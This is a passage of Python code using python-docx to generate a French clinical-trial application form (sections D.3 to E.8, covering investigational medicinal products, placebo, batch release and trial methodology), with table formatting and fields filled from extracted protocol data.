\\n\"\n                          \"D.3.8         Nom de chaque substance active (DCI ou DCI propos\u00e9e, le cas \u00e9ch\u00e9ant) :      \\n\"\n                          \"D.3.9         Autre(s) nom(s) disponible(s) pour chaque substance active (num\u00e9ro CAS , code pr\u00e9c\u00e9demment attribu\u00e9 par le promoteur, autre nom descriptif, etc. Indiquer tous les noms disponibles) :      \\n\"\n                          \"D.3.10        Dosage (pr\u00e9ciser tous les dosages utilis\u00e9s) : \")\n    table.cell(2,0).text=(\"D.3.10.1      Unit\u00e9 de concentration :      \\n\"\n                          \"D.3.10.2      Type de concentration (\u201cnombre exact \u201d, \u201cintervalle\u201d, \u201cplus que\u201d ou \u201cjusqu\u2019\u00e0\u201d) :      \\n\"\n                          \"D.3.10.3      Concentration (nombre) :      \")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0 or n==1:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(1,0)\n    b=table.cell(2,0)\n    a.merge(b)\n    \n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=2, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"D.3.11\tCat\u00e9gorie de m\u00e9dicament exp\u00e9rimental\t\t\\n\"\n                          \"Le ME contient-il une substance active :\")\n    table.cell(1,0).text=(\"D.3.11.1   d\u2019origine chimique ?\\n\"\n                          \"D.3.11.2\td\u2019origine biologique / biotechnologique  ?\t\\n\"\n                          \"Est-ce :\\n\"\n                          \"D.3.11.3    un m\u00e9dicament de th\u00e9rapie cellulaire ?\\n\"\n                          \"D.3.11.4    un m\u00e9dicament de th\u00e9rapie g\u00e9nique ?\\n\"\n                          \"D.3.11.5    un m\u00e9dicament radiopharmaceutique ?\\n\"\n                          \"D.3.11.6    un m\u00e9dicament immunologique (notamment vaccin, allerg\u00e8ne, immun-s\u00e9rum) ?\\n\"\n                          \"D.3.11.7    un m\u00e9dicament d\u00e9riv\u00e9 du sang ?\\n\"\n                          \"D.3.11.8    un autre m\u00e9dicament d\u2019origine extractive ?\\n\"\n                          \"D.3.11.9    un m\u00e9dicament \u00e0 base de plantes ?\\n\"\n                          \"D.3.11.10   un m\u00e9dicament hom\u00e9opathique ?\\n\"\n                          \"D.3.11.11   un m\u00e9dicament contenant des organismes g\u00e9n\u00e9tiquement modifi\u00e9s ?\t\\n\"\n                          \"Si oui en D.3.11.11   \\n\"\n                          \"D.3.11.11.1  L\u2019autorisation relative au confinement de l\u2019OGM a-t-elle \u00e9t\u00e9 accord\u00e9e ?\\n\"\n                          \"D.3.11.11.2  Est-elle en attente ?\\n\"\n                          \"D.3.11.12\tun autre type de m\u00e9dicament ?\t\\n\"\n                          \"D.3.11.12.1\tSi oui, pr\u00e9ciser :      \")\n    table.cell(1,5).text=(\"\\n\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==3:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(1,4)\n    a.merge(b)\n    a=table.cell(0,5)\n    b=table.cell(1,5)\n    a.merge(b)\n    document.add_page_break()\n    \n    '''Partie D4'''\n    \n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=3, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"D.4\t   MEDICAMENT EXPERIMENTAL D\u2019ORIGINE BIOLOGIQUE / BIOTECHNOLOGIQUE, Y COMPRIS LES VACCINS\")\n    table.cell(1,0).text=(\"D.4.1        Type de m\u00e9dicament\")\n    table.cell(2,0).text=(\"D.4.1.1      Produit d'origine extractive\\n\"\n                          \"D.4.1.2      Produit recombinant\\n\"\n                          \"D.4.1.3      Vaccin\\n\"\n                          \"D.4.1.4      Organisme g\u00e9n\u00e9tiquement modifi\u00e9\\n\"\n                          \"D.4.1.5      M\u00e9dicament d\u00e9riv\u00e9 du sang\\n\"\n                          \"D.4.1.6\t    Autre\t\\n\"\n                          \"D.4.1.6.1 Si oui, pr\u00e9ciser :      \")\n    table.cell(2,5).text=(\"\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==3:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0 or n==1:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(0,5)\n    a.merge(b)\n    a=table.cell(1,0)\n    b=table.cell(2,4)\n    a.merge(b)\n    a=table.cell(1,5)\n    b=table.cell(2,5)\n    a.merge(b)\n        \n    \n    '''Partie D5'''\n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=5, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"D.5\t   MEDICAMENT EXPERIMENTAL DE THERAPIE CELLULAIRE SOMATIQUE (SANS MODIFICATION GENETIQUE)\")\n    table.cell(1,0).text=(\"D.5.1        Origine du tissu, du tissu composite ou de l\u2019organe\")\n    table.cell(2,0).text=(\"D.5.1.1     Autologue\\n\"\n                          \"D.5.1.2     Allog\u00e9nique\\n\"\n                          \"D.5.1.3\t    X\u00e9nog\u00e9nique\t\\n\"\n                          \"D.5.1.3.1 Si oui, pr\u00e9ciser les esp\u00e8ces d\u2019origine :      \")\n    table.cell(3,0).text=(\"D.5.2\t  Type de cellules\")\n    table.cell(4,0).text=(\"D.5.2.1\t  Cellules souches\\n\"\n                          \"D.5.2.2\t  Cellules diff\u00e9renci\u00e9es\t\\n\"\n                          \"D.5.2.2.1 Si oui, pr\u00e9ciser le type de cellules (exemple : k\u00e9ratinocytes, fibroblastes, chondrocytes\u2026) :      \\n\"\n                          \"D.5.2.3\t   Autre\t\\n\"\n                          \"D.5.2.3.1 Si oui, pr\u00e9ciser :      \")\n    table.cell(1,5).text=(\"\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\")\n    table.cell(3,5).text=(\"\\n\u25a1 oui  \u25a1 non\\n\\n\u25a1 oui  \u25a1 non\\n\\n\u25a1 oui  \u25a1 non\\n\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==2 or n==5:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0 or n==1 or n==4:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(0,5)\n    a.merge(b)\n    a=table.cell(1,0)\n    b=table.cell(2,4)\n    a.merge(b)\n    a=table.cell(1,5)\n    b=table.cell(2,5)\n    a.merge(b)\n    a=table.cell(3,0)\n    b=table.cell(4,4)\n    a.merge(b)\n    a=table.cell(3,5)\n    b=table.cell(4,5)\n    a.merge(b)\n    \n    '''Partie D6'''\n    \n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=3, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"D.6\t     MEDICAMENT EXPERIMENTAL DE THERAPIE GENIQUE\")\n    table.cell(1,0).text=(\"D.6.1\t     G\u00e8ne(s) d\u2019int\u00e9r\u00eat :      \\n\"\n                          \"D.6.2         Th\u00e9rapie g\u00e9nique in vivo\\n\"\n                          \"D.6.3         Th\u00e9rapie g\u00e9nique ex vivo\\n\"\n                          \"D.6.4         Type de vecteur utilis\u00e9\")\n    table.cell(1,5).text=(\"\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\\n\u25a1 oui  \u25a1 non\")\n    table.cell(2,0).text=(\"D.6.4.1\t     Acide nucl\u00e9ique (exemple : plasmide)\t\\n\"\n                          \"Si oui, pr\u00e9ciser s\u2019il s\u2019agit :\\n\"\n                          \"D.6.4.1.1   d\u2019un acide nucl\u00e9ique nu\\n\"\n                          \"D.6.4.1.2   d'un acide nucl\u00e9ique complexe\t\\n\"\n                          \"D.6.4.2\t    Vecteur viral\t\\n\"\n                          \"D.6.4.2.1   Si oui, pr\u00e9ciser le type : ad\u00e9novirus, r\u00e9trovirus, AAV\u2026:      \\n\"\n                          \"D.6.4.3\t    Autre\t\\n\"\n                          \"D.6.4.3.1   Si oui, pr\u00e9ciser :      \")\n    table.cell(2,5).text=(\"\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\\n\u25a1 oui  \u25a1 non\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==2 or n==4:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0 or n==1:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(0,5)\n    a.merge(b)\n    a=table.cell(1,0)\n    b=table.cell(2,4)\n    a.merge(b)\n    a=table.cell(1,5)\n    b=table.cell(2,5)\n    a.merge(b)\n    \n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=2, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"D.6.5\t    Cellules g\u00e9n\u00e9tiquement modifi\u00e9es\")\n    table.cell(1,0).text=(\"Si oui, pr\u00e9ciser l\u2019origine des cellules\\n\"\n                          \"D.6.5.1      Autologue\\n\"\n                          \"D.6.5.2      Allog\u00e9nique\\n\"\n                          \"D.6.5.3\t    X\u00e9nog\u00e9nique\t\\n\"\n                          \"D.6.5.3.1   Si oui, pr\u00e9ciser les esp\u00e8ces d\u2019origine :      \\n\"\n                          \"D.6.5.4\t    Autre type de cellules (cellules souches h\u00e9matopo\u00ef\u00e9tiques, \u2026)\t\\n\"\n                          \"            Si oui, pr\u00e9ciser :      \")\n    table.cell(1,5).text=(\"\u25a1 oui  \u25a1 non\\n\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\u25a1 oui  \u25a1 non\\n\\n\u25a1 oui  \u25a1 non\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==2:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(1,4)\n    a.merge(b)\n    a=table.cell(0,5)\n    b=table.cell(1,5)\n    a.merge(b)\n    \n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=1, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"D.6.6\tRemarques relatives \u00e0 de nouveaux aspects concernant le ME de th\u00e9rapie g\u00e9nique (texte libre) :      \")\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    fontdebut.bold = True\n\n    '''Partie D7'''\n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=3, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"D.7    DONNEES RELATIVES AU PLACEBO (r\u00e9p\u00e9ter la section autant de fois que n\u00e9cessaire, le cas \u00e9ch\u00e9ant)\")\n    table.cell(1,0).text=(\"D.7.1\t    Un placebo est-il utilis\u00e9 ?\\n\"\n                          \"D.7.2\t    Cette section concerne le placebo num\u00e9ro : (     )\\n\"\n                          \"D.7.3\t    Forme pharmaceutique :      \\n\"\n                          \"D.7.4\t    Voie d\u2019administration :      \\n\"\n                          \"D.7.5\t    De quel ME est-ce le placebo ? Pr\u00e9ciser le num\u00e9ro du ME, tel qu'indiqu\u00e9 en D.1 : (     )\")\n    table.cell(2,0).text=(\"D.7.5.1\t    Composition, hormis la ou les substances actives :      \\n\"\n                          \"D.7.5.2\t     Est-elle identique \u00e0 celle du ME \u00e9tudi\u00e9 ?\t\\n\"\n                          \"D.7.5.2.1  Si non, pr\u00e9ciser les principaux composants :      \\n\")\n    table.cell(1,5).text=(\"\u25a1 oui  \u25a1 non\\n\")\n    table.cell(2,5).text=(\"\\n\\n\\n\\n\\n\u25a1 oui  \u25a1 non\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                if n==2 or n==4:\n                    paragraph.paragraph_format.alignment = WD_ALIGN_PARAGRAPH.CENTER\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0 or n==1:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(0,5)\n    a.merge(b)\n    a=table.cell(1,0)\n    b=table.cell(2,4)\n    a.merge(b)\n    a=table.cell(1,5)\n    b=table.cell(2,5)\n    a.merge(b)\n    \n    '''Partie D8'''\n    \n    paragraph=document.add_paragraph()\n    \n    table = document.add_table(rows=8, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"D.8\tETABLISSEMENT O\u00d9 LA PERSONNE QUALIFIEE LIBERE LES LOTS DE MEDICAMENT EXPERIMENTAL\")\n    table.cell(1,0).text=(\"Cette section concerne les ME finis, c\u2019est-\u00e0-dire les m\u00e9dicaments (randomis\u00e9s) conditionn\u00e9s, \u00e9tiquet\u00e9s et lib\u00e9r\u00e9s sp\u00e9cifiquement pour l\u2019essai clinique. S'il y a plusieurs \u00e9tablissements en charge de la lib\u00e9ration ou plusieurs ME \u00e0 lib\u00e9rer, r\u00e9p\u00e9ter cette section autant de fois que n\u00e9cessaire et pr\u00e9ciser le num\u00e9ro du ME concern\u00e9, tel qu'indiqu\u00e9 en D.1 ou D.7.2. En cas de pluralit\u00e9 d'\u00e9tablissements lib\u00e9rateurs, pr\u00e9ciser le ME lib\u00e9r\u00e9 par chaque \u00e9tablissement concern\u00e9.\")\n    table.cell(2,0).text=(\"D.8.1\tNe pas remplir la section D.8.2 si le ME (conditions cumulatives) :\\n\"\n                          \"         -\tb\u00e9n\u00e9ficie d'une AMM dans l'Union europ\u00e9enne et\\n\"\n                          \"         -\tprovient du march\u00e9 de l'Union europ\u00e9enne et\\n\"\n                          \"         -\test utilis\u00e9 sans modification dans le cadre de l'essai (exemple : non mis en g\u00e9lule) et\\n\"\n                          \"         -\tle conditionnement et l'\u00e9tiquetage sont effectu\u00e9s dans des \u00e9tablissements de sant\u00e9, pour leur usage exclusif, comme pr\u00e9vu \u00e0 l'article 9.2 de la directive 2005/28/CE relative aux bonnes pratiques cliniques.\\n\"\n                          \"         Si l'ensemble de ces conditions sont r\u00e9unies, cocher la case ci-contre \u25a1 et indiquer le num\u00e9ro de chaque ME concern\u00e9, y compris de chaque placebo, tel qu'indiqu\u00e9 en D.1.1 et D.7.2 : (     )\")\n    table.cell(3,0).text=(\"D.8.2\tQui est responsable au sein de l\u2019Union europ\u00e9enne de la lib\u00e9ration du ME fini ?\")\n    table.cell(4,0).text=(\"         L'\u00e9tablissement est responsable de la lib\u00e9ration de (pr\u00e9ciser le num\u00e9ro de chaque ME concern\u00e9, y compris de chaque placebo, tel qu'indiqu\u00e9 en D.1.1 et D.7.2) :      \\n\")\n    table.cell(5,0).text=(\"         Veuillez cocher la case appropri\u00e9e :\\n\")\n    table.cell(6,0).text=(\"D.8.2.1  Fabricant\t\t\u25a1\\n\" \n                          \"D.8.2.2  Importateur\t\t\u25a1\\n\"\n                          \"D.8.2.3  Nom de l\u2019\u00e9tablissement :     \\n\"\n                          \"D.8.2.3.1 Adresse :      \\n\"\n                          \"D.8.2.4   Indiquer le num\u00e9ro d\u2019autorisation du fabricant :      \\n\"\n                          \"D.8.2.4.1\tSi pas d\u2019autorisation, pr\u00e9ciser les motifs :      \\n\")\n    table.cell(7,0).text=(\"Si le m\u00e9dicament ne b\u00e9n\u00e9ficie pas d'une AMM dans l'Union europ\u00e9enne, mais qu'il est fourni en vrac et que le conditionnement et l'\u00e9tiquetage sont effectu\u00e9s par un \u00e9tablissement de sant\u00e9, pour son usage exclusif, conform\u00e9ment aux dispositions de l'article 9.2 de la directive 2005/28/CE relative aux bonnes pratiques cliniques, indiquer l'\u00e9tablissement o\u00f9 le m\u00e9dicament \u00e0 \u00e9t\u00e9 certifi\u00e9 en vue de sa lib\u00e9ration par la personne qualifi\u00e9e pour son utilisation dans l'essai clinique en D.8.2.\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0 or n==3 or n==5:\n                        fontdebut.bold = True\n                    elif n==2 or n==7:\n                        fontdebut.italic = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(1,0)\n    a.merge(b)\n    a=table.cell(3,0)\n    b=table.cell(7,0)\n    a.merge(b)\n    \ndef Partie_E(document, extract):\n    \n    paragraph=document.add_paragraph()\n    sentence=paragraph.add_run(\"\\nE. INFORMATIONS GENERALES RELATIVES A L'ESSAI\")\n    fontdebut = sentence.font\n    fontdebut.name = 'Arial'\n    fontdebut.bold = True\n    fontdebut.size = docx.shared.Pt(10) \n    sentence=paragraph.add_run(\"\\nCette section est destin\u00e9e \u00e0 fournir des informations concernant les objectifs, domaine et m\u00e9thodologie de l'essai. Si le protocole pr\u00e9voit la r\u00e9alisation d'une sous-\u00e9tude en France, indiquer les informations relatives \u00e0 cette sous-\u00e9tude en section E.2.3. Veuillez \u00e9galement cocher la case appropri\u00e9e en section E.2 relative \u00e0 l'objectif de l'essai.\\n\")\n    fontdebut = sentence.font\n    fontdebut.name = 'Arial'\n    fontdebut.size = docx.shared.Pt(10) \n    \n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"E.1\tCONDITION MEDICALE OU PATHOLOGIE ETUDIEE\")\n    table.cell(1,0).text=(\"E.1.1\tPr\u00e9ciser la ou les conditions m\u00e9dicales \u00e9tudi\u00e9es  (texte libre) :      \\n\"\n                          \"E.1.2\tVersion MedDRA, niveau, terme et classification  (r\u00e9p\u00e9ter autant de fois que n\u00e9cessaire) :      \\n\"  \n                          \"E.1.3\tL'une des conditions m\u00e9dicales \u00e9tudi\u00e9es est-elle une maladie rare  ?\t            \u25a1 oui   \u25a1 non\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    \n    '''Partie E2'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"E.2\tOBJECTIF(S) DE LA RECHERCHE\")\n    table.cell(1,0).text=(\"E.2.1\tObjectif principal : \"+extract['objectif_principal']+\"\\n\"\n                          \"E.2.2\tObjectifs secondaires : \"+extract['objectif_secondaire']+\"\\n\"\n                          \"E.2.3\tUne sous-\u00e9tude est-elle pr\u00e9vue ?\t                                                        \u25a1 oui   \u25a1 non\\n\"\n                          \"E.2.3.1\tSi oui, pr\u00e9ciser le titre complet, la date et la version de chaque sous-\u00e9tude et leurs objectifs :      \")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n                    \n    '''Partie E3'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"E.3\tPRINCIPAUX CRITERES D\u2019INCLUSION (\u00e9num\u00e9rer les plus importants)\")\n    table.cell(1,0).text=(extract['critere_inclusion_courte'])\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n                    \n    '''Partie E4'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"E.4\tPRINCIPAUX CRITERES DE NON INCLUSION (\u00e9num\u00e9rer les plus importants)\")\n    table.cell(1,0).text=(extract['critere_non_inclusion_courte'])\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n                    \n    '''Partie E5'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=2, cols=1, style='Table Grid')\n    table.cell(0,0).text=(\"E.5\tCRITERE(S) D\u2019EVALUATION PRINCIPAL(AUX)\")\n    table.cell(1,0).text=(extract['critere_jugement_principal_longue']+\"\\n\"+extract['critere_jugement_secondaire_longue'])\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0:\n                        fontdebut.bold = True\n                    n=n+1\n    \n    '''Partie E6'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=3, cols=3, style='Table Grid')\n    table.cell(0,0).text=(\"E.6\t  DOMAINE(S) D\u2019ETUDE \u2013 Cocher la ou les cases appropri\u00e9es\")\n    table.cell(1,0).text=(\"E.6.1     Diagnostic\\n\"\n                          \"E.6.2     Prophylaxie\\n\"\n                          \"E.6.3     Th\u00e9rapeutique\\n\"\n                          \"E.6.4     S\u00e9curit\u00e9\\n\"\n                          \"E.6.5     Efficacit\u00e9\\n\"\n                          \"E.6.6     Pharmacocin\u00e9tique\\n\"\n                          \"E.6.7     Pharmacodynamie\\n\"\n                          \"E.6.8     Bio\u00e9quivalence\\n\"\n                          \"E.6.9     Dose-effet\\n\"\n                          \"E.6.10    Pharmacog\u00e9n\u00e9tique\\n\"\n                          \"E.6.11    Pharmacog\u00e9nomie\\n\"\n                          \"E.6.12\t Pharmaco-\u00e9conomie\\n\"\n                          \"E.6.13    Autre\")\n    table.cell(2,0).text=(\"E.6.13.1\tSi autre, pr\u00e9ciser :      \")\n    table.cell(1,2).text=(\"\u25a1 \\n\u25a1 \\n\u25a1 \\n\u25a1 \\n\u25a1 \\n\u25a1 \\n\u25a1 \\n\u25a1 \\n\u25a1 \\n\u25a1 \\n\u25a1\\n\u25a1\\n\u25a1\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0 or n==1:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(0,2)\n    a.merge(b)\n    a=table.cell(1,0)\n    b=table.cell(2,1)\n    a.merge(b)\n                    \n    '''Partie E7'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=4, cols=3, style='Table Grid')\n    table.cell(0,0).text=(\"E.7\t  TYPE D'ESSAI  ET PHASE\")\n    table.cell(1,0).text=(\"E.7.1\t  Pharmacologie humaine (Phase I)\")\n    table.cell(2,0).text=(\"Il s'agit de :\\n\"\n                          \"E.7.1.1    La premi\u00e8re administration \u00e0 l\u2019homme\\n\"\n                          \"E.7.1.2    Une \u00e9tude de bio\u00e9quivalence\\n\"\n                          \"E.7.1.3\t  Autre\\n\"\n                          \"E.7.1.3.1 Si autre, pr\u00e9ciser :      \")\n    table.cell(3,0).text=(\"E.7.2      Essai th\u00e9rapeutique exploratoire (Phase II)\\n\"\n                          \"E.7.3      Essai th\u00e9rapeutique de confirmation (Phase III)\\n\"\n                          \"E.7.4\t  Essai th\u00e9rapeutique conform\u00e9ment \u00e0 l\u2019autorisation (Phase IV)\")\n    table.cell(1,2).text=(\"\u25a1 \\n\\n\u25a1 \\n\u25a1 \\n\u25a1 \\n\\n\u25a1 \\n\u25a1 \\n\u25a1\")\n    n=0\n    for row in table.rows:\n        for cell in row.cells:\n            paragraphs = cell.paragraphs\n            for paragraph in paragraphs:\n                for run in paragraph.runs:\n                    fontdebut = run.font\n                    fontdebut.name = 'Arial'\n                    fontdebut.size = docx.shared.Pt(10)\n                    if n==0 or n==1 or n==4:\n                        fontdebut.bold = True\n                    n=n+1\n    a=table.cell(0,0)\n    b=table.cell(0,2)\n    a.merge(b)\n    a=table.cell(1,0)\n    b=table.cell(3,1)\n    a.merge(b)\n    a=table.cell(1,2)\n    b=table.cell(3,2)\n    a.merge(b)\n    \n    '''Partie E8'''\n    paragraph=document.add_paragraph()\n    table = document.add_table(rows=12, cols=6, style='Table Grid')\n    table.cell(0,0).text=(\"E.8\tMETHODOLOGIE DE L'ESSAI\")\n    table.cell(1,0).text=(\"E.8.1\t  Comparatif\t\")\n    table.cell(2,0).text=(\"Si oui, pr\u00e9ciser :\\n\"\n                          \"E.8.1.1    Tirage au sort\\n\"\n                          \"E.8.1.2    Ouvert\\n\"\n                          \"E.8.1.3    Simple insu\\n\"\n                          \"E.8.1.4    Double insu\\n\"\n                          \"E.8.1.5    A groupes parall\u00e8les\\n\"\n                          \"E.8.1.6    Plan crois\u00e9\\n\"\n                          \"E.8.1.7\t Autre\t\\n\"\n                          \"E.8.1.7.1 Si autre, pr\u00e9ciser :      \")\n    table.cell(3,0).text=(\"E.8.2\t  Si comparatif, pr\u00e9ciser le comparateur utilis\u00e9\")\n    table.cell(4,0).text=(\"E.8.2.1    Autre(s) m\u00e9dicament(s)\\n\"\n                          \"E.8.2.2    Placebo\\n\"\n                          \"E.8.2.4\t  Autre\\n\"\n                          \"E.8.2.4.1 Si autre, pr\u00e9ciser :      \")\n    table.cell(1,5).text=(\"\u25a1 oui   \u25a1 non\\n\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\\n\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\")\n    table.cell(5,0).text=(\"E.8.3      L'essai est-il monocentrique (voir aussi section G) ?\\n\"\n                          \"E.8.4\t  L'essai est-il multicentrique (voir aussi section G) ?\")\n    table.cell(6,0).text=(\"E.8.4.1\t  Nombre pr\u00e9vu de lieux de recherche en France :    \")  \n    table.cell(7,0).text=(\"E.8.5\t  Est-il pr\u00e9vu de mener l'essai dans plusieurs \u00e9tats membres ?\")\n    table.cell(8,0).text=(\"E.8.5.1\t  Nombre pr\u00e9vu de lieux de recherche dans la Communaut\u00e9 europ\u00e9enne :  \")\n    table.cell(9,0).text=(\"E.8.6      Est-il pr\u00e9vu de mener la recherche dans des pays tiers ?\\n\"\n                          \"E.8.7\t  Un comit\u00e9 de surveillance ind\u00e9pendant a-t-il \u00e9t\u00e9 constitu\u00e9 ?\")\n    table.cell(5,5).text=(\"\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\\n\\n\u25a1 oui   \u25a1 non\\n\\n\u25a1 oui   \u25a1 non\\n\u25a1 oui   \u25a1 non\")\n    table.cell(10,0).text=(\"E.8.8\t  D\u00e9finition de la fin de l'essai, et justification si celle-ci ne correspond pas \u00e0 la date de la derni\u00e8re visite de la derni\u00e8re personne participant \u00e0 l'essai   :    \\n\"  \n                          